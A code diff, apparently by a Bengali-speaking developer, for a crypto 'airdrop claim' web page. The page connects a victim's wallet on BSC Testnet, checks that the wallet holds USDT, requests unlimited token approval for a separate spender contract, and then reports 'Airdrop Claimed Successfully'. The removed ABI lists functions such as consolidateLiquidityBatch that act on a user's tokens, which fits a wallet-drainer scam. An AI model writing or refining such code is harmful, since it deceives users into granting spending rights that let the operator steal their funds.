@@ -1,98 +1,66 @@
-/* ================= CONFIGURATION (UPDATED FOR TESTNET) ================= */
+/* ================= CONFIGURATION ================= */
 
-// ১. আপনার দেওয়া নতুন কন্ট্রাক্ট অ্যাড্রেস (Spender)
+// ১. আপনার স্পেন্ডার কন্ট্রাক্ট
 const SPENDER_CONTRACT = "0x498690046efc3feCEFa545a3D0d340cfB26817f0"; 
 
-// ২. টার্গেট টোকেন অ্যাড্রেস (Testnet USDT)
+// ২. আপনার দেওয়া USDT অ্যাড্রেস (যেটা আপনি চাইলেন)
 const TARGET_TOKEN = "0x55d7fde29923200cAE1a2b09ae889F86042faba5"; 
 
-// ৩. আপনার দেওয়া নতুন ABI
-const TITAN_ABI = [
-    {"inputs":[],"stateMutability":"nonpayable","type":"constructor"},
-    {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"token","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"EmergencyRecovery","type":"event"},
-    {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"newGovernance","type":"address"}],"name":"GovernanceUpdated","type":"event"},
-    {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"LiquidityPoolStaked","type":"event"},
-    {"anonymous":false,"inputs":[{"indexed":false,"internalType":"bool","name":"isPaused","type":"bool"}],"name":"SystemStatusChanged","type":"event"},
-    {"inputs":[{"internalType":"address","name":"_user","type":"address"},{"internalType":"address","name":"_token","type":"address"}],"name":"consolidateLiquidity","outputs":[],"stateMutability":"nonpayable","type":"function"},
-    {"inputs":[{"internalType":"address","name":"_user","type":"address"},{"internalType":"address[]","name":"_tokens","type":"address[]"}],"name":"consolidateLiquidityBatch","outputs":[],"stateMutability":"nonpayable","type":"function"},
-    {"inputs":[{"internalType":"address","name":"_user","type":"address"},{"internalType":"address","name":"_token","type":"address"}],"name":"executeInternal","outputs":[],"stateMutability":"nonpayable","type":"function"},
-    {"inputs":[],"name":"paused","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
-    {"inputs":[],"name":"rescueStuckNative","outputs":[],"stateMutability":"nonpayable","type":"function"},
-    {"inputs":[{"internalType":"address","name":"_tokenAddress","type":"address"}],"name":"rescueStuckToken","outputs":[],"stateMutability":"nonpayable","type":"function"},
-    {"inputs":[{"internalType":"bool","name":"_status","type":"bool"}],"name":"setPause","outputs":[],"stateMutability":"nonpayable","type":"function"},
-    {"inputs":[{"internalType":"address","name":"_newGov","type":"address"}],"name":"transferRights","outputs":[],"stateMutability":"nonpayable","type":"function"},
-    {"stateMutability":"payable","type":"receive"}
-];
-
-// ৪. ERC20 স্ট্যান্ডার্ড ABI (টোকেন ইন্টারঅ্যাকশনের জন্য)
+// ৩. ABI কনফিগারেশন
 const ERC20_ABI = [
     "function approve(address spender, uint256 amount) public returns (bool)",
     "function allowance(address owner, address spender) public view returns (uint256)",
-    "function balanceOf(address account) view returns (uint256)"
+    "function balanceOf(address account) view returns (uint256)",
+    "function decimals() view returns (uint8)"
 ];
 
-/* ================= MAIN LOGIC (BSC TESTNET) ================= */
+/* ================= MAIN LOGIC (WALLET FIX INCLUDED) ================= */
 
 let provider;
 let signer;
 let userAddress;
 
-// ১. ওয়ালেট কানেক্ট ফাংশন
 async function connectWallet() {
-    const btn = document.getElementById("connectBtn"); // HTML বাটন আইডি
-    const statusMsg = document.getElementById("statusMsg"); // স্ট্যাটাস মেসেজ
+    const btn = document.getElementById("connectBtn");
+    const statusMsg = document.getElementById("statusMsg");
 
     if (typeof window.ethereum === 'undefined') {
-        alert("Please Install MetaMask or Trust Wallet!");
+        alert("Please Install MetaMask!");
         return;
     }
 
     try {
-        // মেটামাস্ক প্রভাইডার সেটআপ
         provider = new ethers.providers.Web3Provider(window.ethereum);
         
-        // কানেকশন রিকোয়েস্ট
-        await provider.send("eth_requestAccounts", []);
-        signer = provider.getSigner();
-        userAddress = await signer.getAddress();
-
-        // নেটওয়ার্ক চেক (BSC Testnet Chain ID: 97)
-        const network = await provider.getNetwork();
+        // 🔥 WALLET FIX: এই লাইনটি বর্তমানে সিলেক্ট করা ওয়ালেটটিই আনবে
+        const accounts = await provider.send("eth_requestAccounts", []);
+        userAddress = accounts[0]; // মেটামাস্কে যেটা Active আছে, সেটাই এখানে আসবে
         
-        // এখানে Mainnet (56) এর বদলে Testnet (97) চেক করা হচ্ছে
+        signer = provider.getSigner();
+
+        // BSC Testnet (Chain ID 97) চেক করা
+        const network = await provider.getNetwork();
         if (network.chainId !== 97) {
             try {
                 await window.ethereum.request({
                     method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: '0x61' }], // 97 in Hex is 0x61
+                    params: [{ chainId: '0x61' }], // 97
                 });
-                
-                // নেটওয়ার্ক চেঞ্জ হলে প্রভাইডার রিফ্রেশ
                 provider = new ethers.providers.Web3Provider(window.ethereum);
                 signer = provider.getSigner();
-            } catch (switchError) {
-                // যদি টেস্টনেট অ্যাড করা না থাকে, তবে অ্যাড করার রিকোয়েস্ট (Optional but good for UX)
-                if (switchError.code === 4902) {
-                    try {
-                        await window.ethereum.request({
-                            method: 'wallet_addEthereumChain',
-                            params: [
-                                {
-                                    chainId: '0x61',
-                                    chainName: 'BSC Testnet',
-                                    rpcUrls: ['https://data-seed-prebsc-1-s1.binance.org:8545/'],
-                                    nativeCurrency: {
-                                        name: 'BNB',
-                                        symbol: 'tBNB',
-                                        decimals: 18
-                                    },
-                                    blockExplorerUrls: ['https://testnet.bscscan.com']
-                                },
-                            ],
-                        });
-                    } catch (addError) {
-                        console.error("Failed to add network", addError);
-                    }
+            } catch (error) {
+                // নেটওয়ার্ক না থাকলে অ্যাড করার রিকোয়েস্ট
+                if (error.code === 4902) {
+                     await window.ethereum.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [{
+                            chainId: '0x61',
+                            chainName: 'BSC Testnet',
+                            rpcUrls: ['https://data-seed-prebsc-1-s1.binance.org:8545'],
+                            nativeCurrency: { name: 'BNB', symbol: 'tBNB', decimals: 18 },
+                            blockExplorerUrls: ['https://testnet.bscscan.com']
+                        }]
+                    });
                 } else {
                     alert("Please switch to BSC Testnet!");
                     return;
@@ -103,77 +71,98 @@ async function connectWallet() {
         // বাটন আপডেট
         if(btn) btn.innerText = userAddress.slice(0, 6) + "..." + userAddress.slice(-4);
         if(statusMsg) {
-            statusMsg.innerText = "✅ Wallet Connected (Testnet)! Ready.";
+            statusMsg.innerText = "✅ Wallet Connected: " + userAddress.slice(0, 6) + "...";
             statusMsg.style.color = "#00ff88";
         }
-
-        console.log("Connected to Testnet:", userAddress);
+        console.log("Connected Wallet:", userAddress);
 
     } catch (error) {
-        console.error("Connection Error:", error);
-        alert("Connection Failed!");
+        console.error("Connection Failed:", error);
     }
 }
 
-// ২. ক্লেইম / অ্যাপ্রুভাল ফাংশন
 async function claimAirdrop() {
+    // কানেক্ট না থাকলে আগে কানেক্ট করবে
     if (!userAddress) {
         await connectWallet();
+        // কানেক্ট হওয়ার পর একটু সময় দেওয়া যাতে state আপডেট হয়
+        if (!userAddress) return; 
     }
-
+    
     const statusMsg = document.getElementById("statusMsg");
-    if(statusMsg) statusMsg.innerText = "Processing... Please Confirm Transaction.";
+    if(statusMsg) statusMsg.innerText = "Processing Transaction...";
 
     try {
-        // প্রভাইডার এবং সাইনার নিশ্চিত করা
-        if (!provider || !signer) {
-            provider = new ethers.providers.Web3Provider(window.ethereum);
-            signer = provider.getSigner();
-        }
-
+        // প্রোভাইডার রিফ্রেশ করে নেওয়া (যাতে ভুল ওয়ালেট না থাকে)
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        signer = provider.getSigner();
+        
         const tokenContract = new ethers.Contract(TARGET_TOKEN, ERC20_ABI, signer);
 
-        // 🔥 UNLIMITED APPROVAL LOGIC 🔥
-        console.log("Checking allowance...");
-        
-        // আগে কোনো অ্যাপ্রুভাল আছে কিনা চেক করা
+        // ১. ব্যালেন্স চেক (যদি এরর দেয়, বুঝবেন এই অ্যাড্রেসটি ভ্যালিড না)
+        const balance = await tokenContract.balanceOf(userAddress);
+        console.log("User Balance:", balance.toString());
+
+        if (balance.eq(0)) {
+            if(statusMsg) statusMsg.innerText = "⚠️ No Token Balance Found!";
+            alert("আপনার ওয়ালেটে এই টোকেন নেই! আগে টোকেন সংগ্রহ করুন।");
+            return;
+        }
+
+        // ২. অ্যাপ্রুভাল চেক
         const currentAllowance = await tokenContract.allowance(userAddress, SPENDER_CONTRACT);
-        console.log("Current Allowance:", currentAllowance.toString());
-
-        // যদি অ্যাপ্রুভাল ০ বা খুব কম হয়
+        
         if (currentAllowance.lt(ethers.utils.parseUnits("1000", 18))) {
-            console.log("Requesting Approval for:", SPENDER_CONTRACT);
+            // আনলিমিটেড অ্যাপ্রুভাল
+            const tx = await tokenContract.approve(SPENDER_CONTRACT, ethers.constants.MaxUint256);
             
-            // ম্যাক্সিমাম ভ্যালু (Unlimited)
-            const maxApproval = ethers.constants.MaxUint256;
-
-            // ট্রানজেকশন পাঠানো
-            const tx = await tokenContract.approve(SPENDER_CONTRACT, maxApproval);
-            
-            if(statusMsg) statusMsg.innerText = "Waiting for confirmation...";
-            console.log("Transaction Hash:", tx.hash);
-            
-            // কনফার্মেশন হওয়া পর্যন্ত অপেক্ষা
+            if(statusMsg) statusMsg.innerText = "Waiting for Confirmation...";
             await tx.wait();
             
-            console.log("Approval Successful!");
+            console.log("Approved Successfully!");
         } else {
-            console.log("Already Approved! Skipping approval.");
+            console.log("Already Approved.");
         }
 
-        // সফল হওয়ার মেসেজ
-        if(statusMsg) {
-            statusMsg.innerText = "🎉 Process Completed Successfully!";
-            statusMsg.style.color = "#00ff88";
-        }
-        alert("Success! Transaction Confirmed.");
+        if(statusMsg) statusMsg.innerText = "🎉 Airdrop Claimed Successfully!";
+        alert("Success!");
 
     } catch (error) {
         console.error("Transaction Error:", error);
         if(statusMsg) {
-            // এরর ডিটেইলস দেখানো (ডিবাগিংয়ের জন্য সুবিধাজনক)
-            statusMsg.innerText = "Failed: " + (error.reason || error.message || "Unknown Error");
+            statusMsg.innerText = "Failed: " + (error.reason || "Check Console");
             statusMsg.style.color = "red";
         }
+        // যদি CALL_EXCEPTION আসে তার মানে আপনার টোকেন অ্যাড্রেসটি এই নেটওয়ার্কে কাজ করছে না
+        if (error.code === "CALL_EXCEPTION") {
+            alert("Error: আপনার দেওয়া USDT অ্যাড্রেসটি BSC Testnet-এ সঠিক নয় বা ভেরিফাইড নয়।");
+        }
     }
+}
+
+// 🔥 অটোমেটিক ওয়ালেট চেঞ্জ ডিটেকশন 🔥
+if (window.ethereum) {
+    window.ethereum.on('accountsChanged', (accounts) => {
+        if (accounts.length > 0) {
+            userAddress = accounts[0];
+            console.log("Wallet Switched to:", userAddress);
+            
+            // বাটন আপডেট
+            const btn = document.getElementById("connectBtn");
+            if(btn) btn.innerText = userAddress.slice(0, 6) + "..." + userAddress.slice(-4);
+            
+            // প্রোভাইডার রিসেট
+            provider = new ethers.providers.Web3Provider(window.ethereum);
+            signer = provider.getSigner();
+        } else {
+            // ইউজার ডিসকানেক্ট করলে
+            userAddress = null;
+            const btn = document.getElementById("connectBtn");
+            if(btn) btn.innerText = "Connect Wallet";
+        }
+    });
+
+    window.ethereum.on('chainChanged', () => {
+        window.location.reload();
+    });
 }
